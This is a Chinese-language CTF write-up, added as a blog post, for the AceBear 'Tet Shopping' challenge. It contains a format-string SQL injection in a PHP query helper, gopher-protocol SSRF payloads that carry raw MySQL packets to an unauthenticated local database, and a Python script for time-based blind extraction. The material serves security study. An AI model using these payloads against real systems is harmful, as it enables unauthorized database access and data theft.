@@ -1,0 +1,225 @@
+---
+title: ssrf+gopher
+date: 2018-06-30 09:52:45
+tags:
+---
+
+## AceBear Security  Contest-Tet Shopping
+
+### 漏洞说明
+
+* 格式化字符串sql注入
+* 基于gopher协议的SSRF攻击完成对mysql未授权漏洞的利用
+* 时间盲注
+
+### 题目
+
+#### 格式化字符串注入忽略
+
+漏洞代码:
+
+info.php
+
+```
+uid = (int)$_SESSION["id"];
+$prepare_qr = $jdb->addParameter("SELECT user from users where uid=%s", $uid);
+$result1 = $jdb->fetch_assoc($prepare_qr);
+$username = $result1[0]['user'];
+
+$prepare_qr = $jdb->addParameter("SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s",  $_GET['uid']);
+$prepare_qr = $jdb->addParameter($prepare_qr.' and user=%s', $username);
+```
+
+这里使用了两次addParameter方法，每次调用该方法，都会执行一次vsprintf方法。
+
+addParamter方法:
+
+```
+function addParameter($qr, $args){
+		if(is_null($qr)){
+			return;
+		}
+		if(strpos($qr, '%') === false ) {
+			return;
+		}
+		$args = func_get_args();
+		array_shift($args);
+		if(is_array($args[0]) && count($args)==1){
+			$args = $args[0];
+		}
+		foreach($args as $arg){
+			if(!is_scalar($arg) && !is_null($arg)){
+				return;
+			}
+		}
+		$qr = str_replace( "'%s'", '%s', $qr); 
+		$qr = str_replace( '"%s"', '%s', $qr); 
+		$qr = preg_replace( '|(?<!%)%f|' , '%F', $qr);
+		$qr = preg_replace( '|(?<!%)%s|', "'%s'", $qr); 
+		
+		array_walk($args, array( $this, 'ebr' ) );
+		return @vsprintf($qr, $args);
+	}
+```
+
+测试代码:
+
+```
+<?php
+    include 'cfg.php';
+    # uid = %1$' or 1=1%23
+    # 
+    # username = ht
+    $username=$_GET['username'];
+    $prepare_qr = $jdb->addParameter("SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s",  $_GET['uid']);
+    print_r("First:<br>");
+    print_r($prepare_qr.'<br>');
+
+    $prepare_qr = $jdb->addParameter($prepare_qr.' and user=%s', $username);
+    print_r("Second:<br>");
+    print_r($prepare_qr);
+```
+
+payload1:
+
+> http://127.0.0.1/acbear/test_ssql.php?uid=%1\$' or 1=1%23&username=ht
+
+结果:
+
+```
+First:
+SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid='%1$\' or 1=1#'
+Second:
+SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid='' or 1=1#' and user='ht'
+```
+
+payload2:
+
+> http://127.0.0.1/acbear/test_ssql.php?uid=%1$c or 1=1%23&username=39
+
+结果:
+
+```
+First:
+SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid='%1$c or 1=1#'
+Second:
+SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid='' or 1=1#' and user='39'
+```
+
+#### ssrf+gopher
+
+1. 本地测试gopher协议
+
+   抓包得到如下数据:
+
+   ASCII:
+
+   ```
+   ............!.......................root..mysql_native_password.d._os.Linux._client_name.libmysql._pid.372._client_version.5.7.22	_platform.x86_64.program_name.mysql!....select @@version_comment limit 1.....SELECT DATABASE().....flag.....show databases.....show tables.....flag......goods......info......users......select * from flag.....
+   ```
+
+   原始数据:
+
+   ```
+   a100000185a6ff0100000001210000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f72640064035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f706964033337320f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c
+   210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031
+   120000000353454c4543542044415441424153452829
+   0500000002666c6167
+   0f0000000373686f7720646174616261736573
+   0c0000000373686f77207461626c6573
+   0600000004666c616700
+   0700000004676f6f647300
+   0600000004696e666f00
+   0700000004757365727300
+   130000000373656c656374202a2066726f6d20666c6167
+   0100000001
+   ```
+
+   将上边的数据合为一行，并使用url编码。
+
+   ```
+   %a1%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%64%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%03%33%37%32%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%05%00%00%00%02%66%6c%61%67%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%06%00%00%00%04%66%6c%61%67%00%07%00%00%00%04%67%6f%6f%64%73%00%06%00%00%00%04%69%6e%66%6f%00%07%00%00%00%04%75%73%65%72%73%00%13%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%01%00%00%00%01
+   ```
+
+   使用gopher协议发送数据。
+
+   ```
+   curl gopher://127.0.0.1:3306/_%a1%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%64%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%03%33%37%32%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%05%00%00%00%02%66%6c%61%67%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%06%00%00%00%04%66%6c%61%67%00%07%00%00%00%04%67%6f%6f%64%73%00%06%00%00%00%04%69%6e%66%6f%00%07%00%00%00%04%75%73%65%72%73%00%13%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%01%00%00%00%01
+   ```
+
+   得到结果:
+
+   ```
+   J
+   f☻ §          3cPWM7S♀9^' mysql_native_password   ☻   ☻   ☺  ☺☺'  ☻♥def   ◄@@version_comment ♀! T     ▼  ↔  ♥∟MySQL Community Server (GPL)  ♦  ☻   ☺  ☺☺   ☻♥def
+   DATABASE() ♀! f     ▼  ☺  ♥  ♦  ☻   ►  ☺   ☻@   ☺♣♦flag☺  ☺☺K  ☻♥def↕information_schemSCHEMATSCHEMATDatabase♂SCHEMA_NAM♀!    ☺    ‼  ♥↕information_schema♦  ♦♥app         bd_study♣  ♠♦blog♂
+   challenges♠ ♣crawl♦     ♥ctf
+   graduate_hnis♠  ☼♣hetaomwjs♣
+     ►     homestead♠  ◄♣jewe  ↕jiansh  ‼mybatis♠  ¶♣mysql   netclass♠  ■♣nuomi♦  ↨♥o2o‼  ↑↕performance_schema       securixiaomi2chinaz  $♠ydjxpt"  %!yolanda_information_collection_02♠  &♣yshop♠  '♣zhihu  (  "   ☺  ☺☺V  ☻♥def↕information_schema♂TABLE_NAMES♂TABLE_NAMES♫Tables_in_flag
+   TABLE_NAME♀!    ☺    ♣  ♥♦flag♠  ♦♣goods♣  ♣♦info♠  ♠♣users    "   +  ☺♥def♦flag♦flag♦flag♦flag♦flag♀! ♂         ☻  ☻
+   ,  ☺♥def♦flag♣goods♣goods♥uid♥uid♀? ♂   ♥♥B   ☺0-  ☻♥def♦flag♣goods♣goods♦name♦name♀!    ♣P    ;  ♥♥def♦flag♣goods♣good♂description♂description♀! X☻  ☺►    +  ♦♥def♦flag♣goods♣goods♥img♥img♀! X☻  ☺►      ♣  ☻   (  ☺♥def♦flag♦info♦info☻id☻i♀? ♂   ♥♥B   ☺0+  ☻♥def♦flag♦info♦info♦user♦user♀! ,☺  ☺►    *  ♥♥def♦flag♦info♦info♥gid♥gid♀? ♂   ♥☺►   ☺0  ♦  ☻   ,  ☺♥def♦flag♣users♣users♥uid♥uid♀? ♂   ♥♥B   ☺0-  ☻♥def♦flag♣users♣users♦user♦user♀!    ♣P    1  ♥♥def♦flag♣users♣users♠passwd♠passwd♀!    ☺►      ♦  ☻   ☺  ☺☺*  ☻♥def♦flag♦flag♦flag♦flag♦flag♀! ♂          ♥▼CTF{SSRF_GOPHER_CAN_YOU_GOT_IT}  ♦
+   ```
+
+   虽然有些乱码，我们可以看到，查询的flag出现了。	
+
+2. 修改sql语句。
+
+   > 130000000373656c656374202a2066726f6d20666c6167
+
+   原始数据中，改行即对应着sql语句，结构如下:
+
+   > hex(sql语句长度加1) + 固定字段(00000003 ) + sql语句16进制编码
+
+   修改该行，即可获得执行对应的sql语句。
+
+### 利用脚本
+
+```python
+import binascii
+import requests
+def str_hex(data):
+    return str(hex(data)).replace('0x','')
+def encode(query):
+    enc_query = ''
+    for i in query:
+        enc_query += str_hex(ord(i))
+    return enc_query
+
+def gen_payload(query):
+    payload = 'a100000185a6ff0100000001210000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f72640064035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f706964033337320f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031120000000353454c45435420444154414241534528290500000002666c61670f0000000373686f77206461746162617365730c0000000373686f77207461626c65730600000004666c6167000700000004676f6f6473000600000004696e666f000700000004757365727300'
+    payload += str_hex(len(query)+1)
+    payload += '00000003'
+    payload += encode(query)
+    payload += '0100000001'
+    return payload
+
+def result(payload):
+    result = [payload[i:i+2] for i in range(0,len(payload),2)]
+    return binascii.b2a_hex(b"gopher://127.0.0.1:3306/_%"+"%".join(result))
+
+def exp():
+    i = 1
+    flag = ""
+    url = "http://128.199.179.156/info.php"
+    cookie = {
+        'PHPSESSID':'av7963h17c1qukv4jm4gklvoi1'
+    }
+    while True:
+        for j in range(127,32,-1):
+            print 'j:'+str(j)
+            query = "select * from flag.flag where IF(ascii(substr((select * from flag.flag),%s,1)) =%s,sleep(5),1);" % (str(i),str(j))
+            uid = "?uid=%1$'%20union%20select%201,1,0x" + result(gen_payload(query)) + "%23"
+            fullurl = url + uid
+            try:
+                r = requests.get(fullurl,cookies=cookie,timeout=5)
+            except Exception as e:
+                flag += chr(j)
+                print(flag)
+                i = i+1
+                break
+    print(flag)
+
+if __name__ == '__main__':
+    exp()
+```
+
